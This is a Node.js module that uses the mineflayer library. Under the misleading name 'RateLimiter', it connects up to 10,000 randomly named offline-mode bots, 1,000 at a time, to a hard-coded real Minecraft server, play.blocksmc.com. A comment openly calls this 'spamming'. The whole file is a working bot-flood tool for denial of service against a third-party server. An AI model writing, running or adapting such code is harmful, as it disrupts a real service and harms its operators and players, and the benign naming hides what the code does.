const mineflayer = require('mineflayer');
const EventEmitter = require('events');

class RateLimiter extends EventEmitter {
  constructor() {
    super();
    this.bots = [];
    this.running = false;
    this.botCount = 0;
    this.maxBots = 10000; // Max bots set to 10,000 for spamming purpose
    this.batchSize = 1000; // Add 1000 bots per batch
    this.batchInterval = 50000; // 50 seconds between batches
    this.server = 'play.blocksmc.com'; // Always use this server
  }

  start() {
    if (this.running) return;
    this.running = true;
    this.emit('log', 'Starting RateLimiter...\n');
    this.addBots(this.batchSize); // Add the first batch immediately
    this.scheduleNextBatch(); // Schedule future batches
  }

  stop() {
    if (!this.running) return;
    this.running = false;
    this.emit('log', 'Stopping RateLimiter...\n');
    
    // Disconnect all bots cleanly
    this.bots.forEach(bot => bot.end()); // Use end() instead of quit() for cleaner disconnection
    this.bots = []; // Clear the bots array
    this.botCount = 0; // Reset bot count
    
    // Remove all listeners to destroy event emitter functionality
    this.removeAllListeners();
  }

  addBots(count) {
    for (let i = 0; i < count; i++) {
      if (this.botCount >= this.maxBots || !this.running) break;
      const username = this.generateRandomUsername(6); // Each username should have 6 characters
      const bot = mineflayer.createBot({
        host: this.server, // Always connect to this server
        port: 25565,
        version: '1.8.9', // Compatible with BlocksMC
        username: username,
        auth: 'offline' // Offline mode for random usernames
      });
      this.setupBotEvents(bot, username);
      this.bots.push(bot);
      this.botCount++;
    }
    this.emit('log', `Added ${count} bots. Total bots: ${this.botCount}\n`);
  }

  scheduleNextBatch() {
    if (!this.running || this.botCount >= this.maxBots) return;
    setTimeout(() => {
      if (this.running) {
        this.addBots(this.batchSize);
        this.scheduleNextBatch();
      }
    }, this.batchInterval);
  }

  setupBotEvents(bot, username) {
    bot.on('login', () => {
      this.emit('log', `Bot ${username} logged in to ${bot.options.host}.\n`);
      // Disconnect after 30 seconds to simulate rate limiting behavior
      setTimeout(() => {
        if (this.running) bot.end();
      }, 30000); // Bot disconnects after 30 seconds
    });

    bot.on('kicked', (reason) => {
      this.emit('log', `Bot ${username} kicked: ${reason}\n`);
      this.removeBot(bot); // Remove bot without reconnecting
    });

    bot.on('error', (err) => {
      if (err.code === 'ECONNRESET') {
        this.emit('log', `Bot ${username} connection reset, ignoring.\n`);
      } else {
        this.emit('log', `Bot ${username} error: ${err.message}\n`);
      }
      this.removeBot(bot); // Remove bot without reconnecting
    });

    bot.on('end', () => {
      this.emit('log', `Bot ${username} disconnected.\n`);
      this.removeBot(bot); // Remove bot without reconnecting
    });
  }

  removeBot(bot) {
    const index = this.bots.indexOf(bot);
    if (index > -1) {
      this.bots.splice(index, 1);
      this.botCount--;
    }
  }

  generateRandomUsername(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789_';
    let result = 'opme_'; // Prefix every username with 'opme_'
    for (let i = 0; i < length - 5; i++) { // Subtract 5 for 'opme_' to ensure total length is 6
      result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result; // e.g., 'opme_a' (6 characters)
  }
}

const rateLimiter = new RateLimiter();

module.exports = {
  startRateLimiter: () => rateLimiter.start(),
  stopRateLimiter: () => rateLimiter.stop(),
  rateLimiterEmitter: rateLimiter
};